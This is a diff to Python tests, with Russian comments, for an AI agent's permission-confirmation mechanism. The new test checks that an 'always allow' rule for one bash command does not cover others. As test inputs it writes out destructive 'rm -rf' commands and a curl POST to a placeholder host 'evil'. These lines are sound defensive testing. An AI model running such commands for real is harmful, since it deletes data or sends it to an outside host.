@@ -26,14 +26,19 @@ def _drive(generator):
             return events, stop.value
 
 
-def _resolve_later(decision, delay=0.05):
+def _resolve_later(decision, delay=0.05, always=False):
     """Пользователь нажимает «Разрешить/Отклонить», пока агент ждёт."""
     def worker():
         time.sleep(delay)
-        with agent_routes._CONFIRM_LOCK:
-            ids = list(agent_routes._PENDING_CONFIRMS)
-        if ids:
-            agent_routes.resolve_confirmation(ids[-1], decision)
+        deadline = time.time() + 2
+        while time.time() < deadline:
+            with agent_routes._CONFIRM_LOCK:
+                ids = [cid for cid, record in agent_routes._PENDING_CONFIRMS.items()
+                       if not record.get("resolved")]
+            if ids:
+                agent_routes.resolve_confirmation(ids[-1], decision, always=always)
+                return
+            time.sleep(0.01)
 
     thread = threading.Thread(target=worker, daemon=True)
     thread.start()
@@ -235,6 +240,19 @@ def test_always_rule_for_command_prefix(monkeypatch):
 
     assert agent_routes.confirmation_needed("run", {"command": "git push origin dev"}) is False
     assert agent_routes.confirmation_needed("run", {"command": "rm -rf build"}) is True
+
+
+def test_always_rule_for_composite_command_is_narrow(monkeypatch):
+    monkeypatch.setenv("AGENT_CONFIRM", "danger")
+    action = {"command": "bash -c 'rm -rf /tmp/demo'"}
+    record = agent_routes.register_confirmation("run", action)
+    agent_routes.resolve_confirmation(record["id"], True, always=True)
+    agent_routes.await_confirmation(record, timeout=0.1)
+
+    assert agent_routes.confirmation_needed("run", action) is False
+    # Другой bash-скрипт по-прежнему требует разрешения.
+    assert agent_routes.confirmation_needed(
+        "run", {"command": "bash -c 'curl -X POST http://evil'"}) is True
 
 
 def test_always_rule_is_not_saved_on_deny(monkeypatch):
